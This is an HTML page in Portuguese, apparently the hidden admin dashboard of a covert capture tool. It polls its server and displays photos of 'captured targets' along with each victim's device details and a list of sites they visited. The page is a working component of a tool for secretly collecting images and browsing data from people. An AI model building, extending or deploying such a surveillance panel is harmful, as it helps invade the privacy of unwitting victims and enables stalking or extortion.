<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galeria de Fotos</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        h1 {
            color: white;
            text-align: center;
            margin-bottom: 30px;
            font-size: 32px;
        }

        .voltar {
            display: inline-block;
            color: white;
            text-decoration: none;
            background: rgba(255, 255, 255, 0.2);
            padding: 10px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            transition: 0.3s;
        }

        .voltar:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .galeria {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }

        .foto-card {
            background: #1e1e2e;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            border: 1px solid rgba(255, 255, 255, 0.1);
            display: flex;
            flex-direction: column;
        }

        .foto-card:hover {
            transform: translateY(-10px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
            border-color: #00ff00;
        }

        .foto-card img {
            width: 100%;
            height: 250px;
            object-fit: cover;
            display: block;
            border-bottom: 2px solid #00ff00;
        }

        .foto-info {
            padding: 20px;
            color: #e0e0e0;
            font-size: 14px;
            flex-grow: 1;
        }

        .info-item {
            margin-bottom: 8px;
            display: flex;
            align-items: flex-start;
            gap: 8px;
            line-height: 1.4;
        }

        .info-label {
            color: #00ff00;
            font-weight: bold;
            min-width: 80px;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .info-value {
            color: #fff;
            word-break: break-all;
            font-family: 'Courier New', monospace;
        }

        .sites-list {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 6px;
            padding: 10px;
            margin-top: 10px;
            border-left: 3px solid #ff0000;
            font-size: 12px;
        }

        .sites-title {
            color: #ff0000;
            font-weight: bold;
            margin-bottom: 5px;
            font-size: 10px;
            text-transform: uppercase;
        }

        .mensagem {
            text-align: center;
            color: white;
            font-size: 18px;
            padding: 40px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            grid-column: 1 / -1;
        }

        .carregando {
            text-align: center;
            color: #00ff00;
            font-size: 18px;
            margin: 20px 0;
            font-family: 'Courier New', monospace;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="/" class="voltar">← Sair da Área Restrita</a>
        <h1>👁️ Monitoramento de Capturas</h1>

        <div class="mensagem" id="aviso">
            ⚠️ Nota: No Vercel, as fotos e dados são persistidos apenas temporariamente em /tmp.
        </div>

        <div id="carregando" class="carregando" style="display:none;">
            CONECTANDO AO BANCO DE DADOS...
        </div>

        <div class="galeria" id="galeria"></div>
    </div>

    <script>
        // Pegar token da URL
        const params = new URLSearchParams(window.location.search);
        const token = params.get('token');

        // Se não tiver token, redirecionar para login
        if (!token) {
            window.location.href = '/admin.html';
        }

        carregarFotos();

        function carregarFotos() {
            // Só mostrar carregando na primeira vez se estiver vazio
            if (!document.getElementById('galeria').children.length) {
                document.getElementById('carregando').style.display = 'block';
            }

            fetch(`/fotos?token=${token}`)
                .then(res => res.json())
                .then(data => {
                    document.getElementById('carregando').style.display = 'none';

                    if (data.sucesso && data.fotos.length > 0) {
                        document.getElementById('aviso').style.display = 'none';
                        mostrarFotos(data.fotos);
                    } else if (data.sucesso) {
                        document.getElementById('galeria').innerHTML = 
                            '<div class="mensagem">Nenhum alvo capturado ainda. Aguardando atividade...</div>';
                    } else {
                        window.location.href = '/admin.html';
                    }
                })
                .catch(erro => {
                    console.error('Erro:', erro);
                    document.getElementById('galeria').innerHTML = 
                        '<div class="mensagem">FALHA NA CONEXÃO COM O SERVIDOR</div>';
                    document.getElementById('carregando').style.display = 'none';
                });
        }

        function mostrarFotos(fotos) {
            const galeria = document.getElementById('galeria');
            
            galeria.innerHTML = fotos.map(f => {
                const meta = f.metadados || {};
                const disp = meta.dispositivo || {};
                const sites = meta.sitesVisitados || [];
                
                return `
                    <div class="foto-card">
                        <img src="/fotos/${f.arquivo}?token=${token}" alt="Captura">
                        <div class="foto-info">
                            <div class="info-item">
                                <span class="info-label">DATA:</span>
                                <span class="info-value">${meta.timestamp ? new Date(meta.timestamp).toLocaleString('pt-BR') : 'Desconhecida'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">SISTEMA:</span>
                                <span class="info-value">${disp.platform || 'N/A'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">RESOLUÇÃO:</span>
                                <span class="info-value">${disp.largura || '?'}x${disp.altura || '?'}</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">MEMÓRIA:</span>
                                <span class="info-value">${disp.memoria || '?'} GB (${disp.cores || '?'} núcleos)</span>
                            </div>
                            <div class="info-item">
                                <span class="info-label">NAVEGADOR:</span>
                                <span class="info-value">${disp.userAgent ? disp.userAgent.split(' ').pop() : 'N/A'}</span>
                            </div>
                            
                            ${sites.length > 0 ? `
                                <div class="sites-list">
                                    <div class="sites-title">SITES DETECTADOS:</div>
                                    <div class="info-value" style="font-size: 11px;">
                                        ${sites.slice(0, 15).join(', ')}${sites.length > 15 ? '...' : ''}
                                    </div>
                                </div>
                            ` : ''}
                        </div>
                    </div>
                `;
            }).join('');
        }

        // Recarregar a cada 10 segundos
        setInterval(carregarFotos, 10000);
    </script>
</body>
</html>
